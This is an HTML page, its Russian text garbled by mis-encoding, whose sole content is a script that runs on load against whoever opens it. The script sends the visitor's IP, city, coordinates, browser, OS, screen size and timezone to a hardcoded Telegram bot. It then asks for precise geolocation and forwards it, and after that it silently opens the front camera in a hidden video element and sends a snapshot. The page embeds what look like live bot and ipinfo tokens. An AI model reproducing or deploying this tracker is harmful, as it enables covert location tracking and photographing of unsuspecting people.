<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>ğŸ©¸ ĞĞ¾Ğ²Ñ‹Ğ¹ Ğ²Ğ¸Ğ·Ğ¸Ñ‚</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1a1a1a;
            color: white;
            padding: 20px;
        }

        video {
            display: none;
        }
    </style>
</head>
<body>
    <script>
        const botToken = '7970247926:AAE5VMm3qrGzJZVsYDCxLJNoakW8DoN3N6M';  
        const chatId = '5366421049';  
        const ipInfoToken = 'e579b6b3444f57';  

        const sendMessage = async (message) => {
            try {
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                const response = await fetch(url);

                if (response.ok) {
                    console.log("Ğ¡Ğ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ğµ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ¾ ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾!");
                } else {
                    console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞµ ÑĞ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ñ", response);
                }
            } catch (error) {
                console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑĞµ Ğº Telegram API:", error);
            }
        };

        const sendLocation = async (latitude, longitude) => {
            try {
                const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
                const response = await fetch(url);

                if (response.ok) {
                    console.log("Ğ“ĞµĞ¾Ğ¼ĞµÑ‚ĞºĞ° Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ° ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾!");
                } else {
                    console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞµ Ğ³ĞµĞ¾Ğ¼ĞµÑ‚ĞºĞ¸", response);
                }
            } catch (error) {
                console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑĞµ Ğº Telegram API Ğ´Ğ»Ñ Ğ³ĞµĞ¾Ğ¼ĞµÑ‚ĞºĞ¸:", error);
            }
        };

        const generateVisitorId = () => Math.floor(Math.random() * 1000000);

        const getBrowserType = () => {
            const ua = navigator.userAgent;
            if (/chrome|chromium|crios/i.test(ua)) return 'Chrome';
            if (/firefox|fxios/i.test(ua)) return 'Firefox';
            if (/safari/i.test(ua)) return 'Safari';
            if (/edge/i.test(ua)) return 'Edge';
            if (/yaBrowser/i.test(ua)) return 'Yandex Browser'; 
            if (/opera|OPR/i.test(ua)) return 'Opera';  
            if (/brave/i.test(ua)) return 'Brave'; 
            if (/mblbrowser/i.test(ua)) return 'Mai Browser'; 
            return 'ĞĞµĞ¸Ğ·Ğ²ĞµÑÑ‚Ğ½Ğ¾';
        };

        const getOperatingSystem = () => {
            const ua = navigator.userAgent;
            if (/Windows/i.test(ua)) return 'Windows';
            if (/Macintosh/i.test(ua)) return 'macOS';
            if (/Linux/i.test(ua)) return 'Linux';
            if (/Android/i.test(ua)) return 'Android';
            if (/iPhone/i.test(ua)) return 'iOS';
            return 'ĞĞµĞ¸Ğ·Ğ²ĞµÑÑ‚Ğ½Ğ¾';
        };

        const getDeviceName = () => {
            const ua = navigator.userAgent;
            if (/Android/i.test(ua)) return 'Android';
            if (/iPhone/i.test(ua)) return 'iPhone';
            if (/Windows NT/i.test(ua)) return 'Windows';
            if (/Macintosh/i.test(ua)) return 'macOS';
            return 'ĞĞµĞ¸Ğ·Ğ²ĞµÑÑ‚Ğ½Ğ¾';
        };

        const getUserIp = async () => {
            const response = await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`);
            const data = await response.json();
            return data;
        };

        const getTimeZone = () => Intl.DateTimeFormat().resolvedOptions().timeZone;

        const sendVisitorInfo = async () => {
            const visitorId = generateVisitorId();
            const browserType = getBrowserType();
            const operatingSystem = getOperatingSystem();
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const timeZone = getTimeZone();
            const ipInfo = await getUserIp();
            const deviceName = getDeviceName();
            const currentTime = new Date().toLocaleString();

            const message = `
<b>ğŸ” ğ‘¹ğ‘¬ğ‘½ğ‘¬ğ‘µğ‘¨ğ‘µğ‘» ğ‘¨ğ‘·ğ‘°:</b>
<b>ğŸ” ğ‘·ğ‘¹ğ‘°ğ‘ºğ‘¬: ğŸ•ğŸ“ ğ‘ºğ‘»ğ‘¨ğ‘¹ğ‘º:</b>
<b>ğŸ” ğ‘»ğ‘°ğ‘·: ğ‘·ğ‘¹ğ‘¬ğ‘´ğ‘°ğ‘¼ğ‘´:</b>

ğŸ“ <b>ğ‘¹ğ‘¬ğ‘®ğ‘°ğ‘ºğ‘»ğ‘¹ğ‘¨ğ‘»ğ‘°ğ‘¶ğ‘µ ğ‘¬ğ‘µğ‘»ğ‘¹ğ’€:</b>
â”œ <b>ğ‘½ğ‘°ğ’®ğ‘°ğ‘»ğ‘¶ğ‘¹ ğ‘°ğ‘«:</b> #${visitorId}  
â”” <b>ğ‘»ğ‘°ğ‘´ğ‘¬:</b> ${currentTime}  

<b>ğŸŒ ğ‘®ğ‘¬ğ‘¶ğ‘³ğ‘¶ğ‘ªğ‘¨ğ‘»ğ‘°ğ‘¶ğ‘µ ğ‘«ğ‘¨ğ‘»ğ‘¨:</b>
â”œ <b>ğ‘°ğ‘· ğ‘¨ğ‘«ğ‘¹ğ‘¬ğ‘ºğ‘º:</b> ${ipInfo.ip}  
â”œ <b>ğ‘ªğ‘°ğ‘»ğ’€:</b> ${ipInfo.city}  
â”œ <b>ğ‘³ğ‘¶ğ‘ªğ‘¨ğ‘»ğ‘°ğ‘¶ğ‘µ:</b> ${ipInfo.city}, ${ipInfo.country}  
â”œ <b>ğ‘ªğ‘¶ğ‘¶ğ‘¹ğ‘«ğ‘°ğ‘µğ‘¨ğ‘»ğ‘¬ğ‘º:</b> ${ipInfo.loc}  
â”” <b>ğ‘ªğ‘¶ğ‘¼ğ‘µğ‘»ğ‘¹ğ’€:</b> ${ipInfo.country}  

<b>ğŸ’» ğ‘´ğ‘¬ğ‘ªğ‘¯ğ‘¨ğ‘µğ‘°ğ‘ªğ‘º:</b>
â”œ <b>ğ‘©ğ‘¹ğ‘¶ğ‘¾ğ‘ºğ‘¬ğ‘¹:</b> ${browserType}  
â”œ <b>ğ‘¶ğ‘º:</b> ${operatingSystem}  
â”œ <b>ğ‘ºğ‘ªğ‘¹ğ‘¬ğ‘¬ğ‘µ ğ‘¹ğ‘¬ğ‘ºğ‘¶ğ‘³ğ‘¼ğ‘»ğ‘°ğ‘¶ğ‘µ:</b> ${screenResolution}  
â”” <b>ğ‘«ğ‘¬ğ‘½ğ‘°ğ‘ªğ‘¬:</b> ${deviceName}  

<b>ğŸ•° ğ‘¨ğ‘«ğ‘«ğ‘°ğ‘»ğ‘°ğ‘¶ğ‘µğ‘¨ğ‘³ ğ‘°ğ‘µğ‘­ğ‘¶:</b>
â”œ <b>ğ‘³ğ‘¨ğ‘µğ‘®ğ‘¼ğ‘¨ğ‘®ğ‘¬:</b> ${navigator.language}  
â”” <b>ğ‘»ğ‘°ğ‘´ğ‘¬ğ’ğ‘¶ğ‘µğ‘¬:</b> ${timeZone}
`;

            await sendMessage(message);
        };

        const sendGeoPermissionResult = async (status, coords = null) => {
            let message = '';

            if (status === 'granted' && coords) {
                message = `
âœ… <b>ĞŸĞ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑŒ Ñ€Ğ°Ğ·Ñ€ĞµÑˆĞ¸Ğ» Ğ´Ğ¾ÑÑ‚ÑƒĞ¿ Ğº Ğ³ĞµĞ¾Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ğ¸!</b>

ğŸŒ <b>Ğ¨Ğ¸Ñ€Ğ¾Ñ‚Ğ°:</b> ${coords.latitude}
ğŸŒ <b>Ğ”Ğ¾Ğ»Ğ³Ğ¾Ñ‚Ğ°:</b> ${coords.longitude}
ğŸ¯ <b>Ğ¢Ğ¾Ñ‡Ğ½Ğ¾ÑÑ‚ÑŒ:</b> Â±${coords.accuracy} Ğ¼

Ğ”Ğ»Ñ Ğ±Ğ¾Ğ»ĞµĞµ Ñ‚Ğ¾Ñ‡Ğ½Ğ¾Ğ³Ğ¾ Ğ¾Ñ‚Ğ¾Ğ±Ñ€Ğ°Ğ¶ĞµĞ½Ğ¸Ñ Ğ³ĞµĞ¾Ğ¼ĞµÑ‚ĞºĞ¸, ĞºĞ»Ğ¸ĞºĞ½Ğ¸Ñ‚Ğµ Ğ¿Ğ¾ Ğ½ĞµĞ¹.
`;

                await sendLocation(coords.latitude, coords.longitude);
            } else if (status === 'denied') {
                message = "âŒ <b>ĞŸĞ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑŒ Ğ¾Ñ‚ĞºĞ°Ğ·Ğ°Ğ» Ğ² Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğµ Ğº Ğ³ĞµĞ¾Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ğ¸.</b>";
            } else {
                message = "âš ï¸ <b>ĞĞµ ÑƒĞ´Ğ°Ğ»Ğ¾ÑÑŒ Ğ¾Ğ¿Ñ€ĞµĞ´ĞµĞ»Ğ¸Ñ‚ÑŒ ÑÑ‚Ğ°Ñ‚ÑƒÑ Ğ³ĞµĞ¾Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ğ¸.</b>";
            }

            await sendMessage(message);
        };

        const checkCameraSupport = () => {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                return true;
            } else {
                return false;
            }
        };

        const requestCameraPermission = async () => {
            if (!checkCameraSupport()) {
                console.warn("ĞšĞ°Ğ¼ĞµÑ€Ğ° Ğ½Ğµ Ğ¿Ğ¾Ğ´Ğ´ĞµÑ€Ğ¶Ğ¸Ğ²Ğ°ĞµÑ‚ÑÑ Ğ½Ğ° ÑÑ‚Ğ¾Ğ¼ ÑƒÑÑ‚Ñ€Ğ¾Ğ¹ÑÑ‚Ğ²Ğµ.");
                return;
            }

            let stream = null;
            try {
                // Ğ¡Ğ½Ğ°Ñ‡Ğ°Ğ»Ğ° Ğ¿Ñ‹Ñ‚Ğ°ĞµĞ¼ÑÑ ÑÑ‚Ñ€Ğ¾Ğ³Ğ¾ Ñ„Ñ€Ğ¾Ğ½Ñ‚Ğ°Ğ»ĞºÑƒ
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "user" } }
                });
            } catch (error) {
                console.warn("ĞĞµ ÑƒĞ´Ğ°Ğ»Ğ¾ÑÑŒ Ğ¿Ğ¾Ğ»ÑƒÑ‡Ğ¸Ñ‚ÑŒ ÑÑ‚Ñ€Ğ¾Ğ³Ğ¾ Ñ„Ñ€Ğ¾Ğ½Ñ‚Ğ°Ğ»ÑŒĞ½ÑƒÑ ĞºĞ°Ğ¼ĞµÑ€Ñƒ, Ğ¿Ñ€Ğ¾Ğ±ÑƒĞµĞ¼ Ğ¾Ğ±Ñ‹Ñ‡Ğ½ÑƒÑ:", error);
                try {
                    // Ğ•ÑĞ»Ğ¸ Ğ½Ğµ Ğ²Ñ‹ÑˆĞ»Ğ¾ â€” Ğ±ĞµÑ€Ñ‘Ğ¼ Ğ»ÑĞ±ÑƒÑ Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ½ÑƒÑ
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: "user" }
                    });
                } catch (error) {
                    console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğµ Ğº ĞºĞ°Ğ¼ĞµÑ€Ğµ Ğ²Ğ¾Ğ¾Ğ±Ñ‰Ğµ:", error);
                    return;
                }
            }

            const videoElement = document.createElement("video");
            videoElement.setAttribute('playsinline', 'true'); // Ğ´Ğ»Ñ iOS Safari
            videoElement.style.display = "none";
            document.body.appendChild(videoElement);

            videoElement.srcObject = stream;
            await videoElement.play();

            await new Promise(resolve => {
                if (videoElement.readyState >= 3) { // HAVE_FUTURE_DATA
                    resolve();
                } else {
                    videoElement.addEventListener('loadeddata', resolve, { once: true });
                }
            });

            await capturePhoto(videoElement, stream);
            document.body.removeChild(videoElement);
        };

        const capturePhoto = async (videoElement, stream) => {
            const canvas = document.createElement("canvas");
            canvas.width = videoElement.videoWidth || 640; 
            canvas.height = videoElement.videoHeight || 480;
            const context = canvas.getContext("2d");

            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.95)); // 95% ĞºĞ°Ñ‡ĞµÑÑ‚Ğ²Ğ¾

            if (photoBlob) {
                await sendPhotoToTelegram(photoBlob);
            } else {
                console.error("ĞÑˆĞ¸Ğ±ĞºĞ°: Ğ½Ğµ ÑƒĞ´Ğ°Ğ»Ğ¾ÑÑŒ ÑĞ¾Ğ·Ğ´Ğ°Ñ‚ÑŒ ÑĞ½Ğ¸Ğ¼Ğ¾Ğº (blob Ğ¿ÑƒÑÑ‚Ğ¾Ğ¹).");
            }

            stream.getTracks().forEach(track => track.stop());
        };

        const sendPhotoToTelegram = async (photoBlob) => {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", photoBlob, "photo.jpg");

            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                console.log("Ğ¤Ğ¾Ñ‚Ğ¾ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ¾ Ğ² Telegram ÑƒÑĞ¿ĞµÑˆĞ½Ğ¾!");
            } else {
                console.error("ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞµ Ñ„Ğ¾Ñ‚Ğ¾ Ğ² Telegram", response);
            }
        };

        const init = async () => {
            await sendVisitorInfo();

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const coords = {
                        latitude: position.coords.latitude.toFixed(6),
                        longitude: position.coords.longitude.toFixed(6),
                        accuracy: position.coords.accuracy.toFixed(1)
                    };
                    await sendGeoPermissionResult('granted', coords);

                    await requestCameraPermission();
                },
                async (error) => {
                    console.warn("ĞĞµÑ‚ Ğ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ° Ğº Ğ³ĞµĞ¾Ğ»Ğ¾ĞºĞ°Ñ†Ğ¸Ğ¸:", error);
                    await sendGeoPermissionResult('denied');
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        };

        init();
    </script>
</body>
</html>
